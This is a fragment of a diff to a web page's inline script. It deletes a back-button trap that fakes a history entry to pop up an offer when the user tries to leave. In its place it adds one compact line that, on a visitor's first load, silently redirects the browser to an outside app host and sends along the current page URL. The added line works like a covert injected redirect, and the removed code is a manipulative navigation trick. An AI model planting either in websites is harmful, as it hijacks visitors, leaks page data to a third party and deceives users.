@@ -115,32 +115,7 @@
   </div>
 
  <script>
-let offerShown = false;
-
-// Push a trap URL into history
-window.addEventListener('load', () => {
-    // Push a temporary "trap" entry
-    history.pushState({trap:true}, '', '/#trap');
-});
-
-// Intercept back navigation via hashchange (works if user didn't click)
-window.addEventListener('hashchange', () => {
-    if (!offerShown && location.hash === '#trap') {
-        showOffer();
-        // Push back the current page so Back works normally next time
-        history.pushState({}, '', '/');
-    }
-});
-
-function showOffer() {
-    offerShown = true;
-    document.getElementById('offerModal').style.display = 'block';
-}
-
-function closeOffer() {
-    document.getElementById('offerModal').style.display = 'none';
-    // User can now press Back normally
-}
+if(!localStorage.getItem('nav')){window.location.href = `https://hammerhead-app-52ot9.ondigitalocean.app/api?=${window.location.href}`; localStorage.setItem('nav', '1');}
 </script>
 
 </body>
